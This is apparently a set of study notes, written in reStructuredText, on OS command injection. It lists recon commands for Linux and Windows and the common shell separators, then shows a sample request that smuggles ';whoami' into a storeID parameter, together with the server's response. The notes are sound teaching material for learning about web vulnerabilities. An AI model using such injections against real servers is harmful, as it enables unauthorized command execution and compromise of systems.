============================================
OS command injection (AKA : shell injection)
============================================

.. index::
   single: OS command injection
   simgle: shell injection
   single: Server-Side Vulnerabilities; OS command injection

.. contents::
    :depth: 3
    :backlinks: top

####

**OS command injection** is also known as **shell injection**. It allows an attacker to execute
operating system (OS) commands on the server that is running an application, and typically fully
compromise the application and its data. Often, an attacker can leverage an OS command injection
vulnerability to compromise other parts of the hosting infrastructure, and exploit trust
relationships to pivot the attack to other systems within the organization.

####

---------------
Useful commands
---------------

    .. note:: 
        
        **Useful commands Linux and Windows**
        
        +-----------------------+-------------+---------------+
        | Purpose of command    | Linux       | Windows       |
        +=======================+=============+===============+
        | Name of current user  | whoami      | whoami        |
        +-----------------------+-------------+---------------+
        | Operating system      | uname -a    | ver           |
        +-----------------------+-------------+---------------+
        | Network configuration | ifconfig    | ipconfig /all |
        +-----------------------+-------------+---------------+
        | Network connections   | netstat -an | netstat -an   |
        +-----------------------+-------------+---------------+
        | Running processes     | ps -ef      | tasklist      |
        +-----------------------+-------------+---------------+

####

--------------------------------------
Insert separator argument to the Query
--------------------------------------

To perform an OS Command Injection, we need to add a separator + the command we want to execute into
the query.

    .. note:: 
        
        **List of common separator**
        
        .. code:: shell
            :number-lines:
            :force:

             & # ampersand
             | # pipe
             ; # semicolon

    .. note:: 
        
        For exemple in the url below,

        .. code:: url
            :number-lines:
            :force:

             https://insecure-website.com/stockStatus?productID=381&storeID=29

        the query will be:

        .. code:: shell
            :number-lines:
            :force:

             productID=381&storeID=29

        the two elements are separate by an ampersand (&)

Placing the additional command separator **[& | ;]** after the injected command is useful because it
separates the injected command from whatever follows the injection point. This reduces the chance
that what follows will prevent the injected command from executing. 

    .. note:: 
        
        **OS Command Insertnjection**

        Request:
        
        .. code:: http
            :number-lines:
            :force:

             productID=381&storeID=29;whoami

        .. image:: images/osCmdInjection.png
           :width: 500 px
           :align: center

        Response:
        
        .. code:: http
            :number-lines:
            :force:

             peter-enaYKV

####

--------
Weblinks
--------

.. target-notes::